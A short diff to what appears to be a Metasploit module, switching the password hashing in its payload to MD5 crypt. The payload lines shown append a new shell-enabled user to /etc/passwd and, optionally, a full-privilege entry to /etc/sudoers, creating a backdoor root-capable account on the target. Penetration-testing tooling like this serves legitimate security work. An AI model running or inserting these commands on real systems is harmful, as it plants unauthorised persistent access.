@@ -76,7 +76,8 @@ module MetasploitModule
            else
              rand(1010..1999).to_s
            end
-    payload_cmd = "echo \'#{user}:#{datastore['PASS'].crypt('Az')}:#{suid}:#{suid}::/:/bin/sh\'>>/etc/passwd"
+    passwd = UnixCrypt::MD5.build(datastore['PASS'], 'Az')
+    payload_cmd = "echo \'#{user}:#{passwd}:#{suid}:#{suid}::/:/bin/sh\'>>/etc/passwd"
     if datastore['RootMethod'] == 'SUDO'
       if datastore['CheckSudoers']
         payload_cmd += ";[ -f /etc/sudoers ]&&(echo \'#{user} ALL=(ALL:ALL) ALL\'>>/etc/sudoers)"
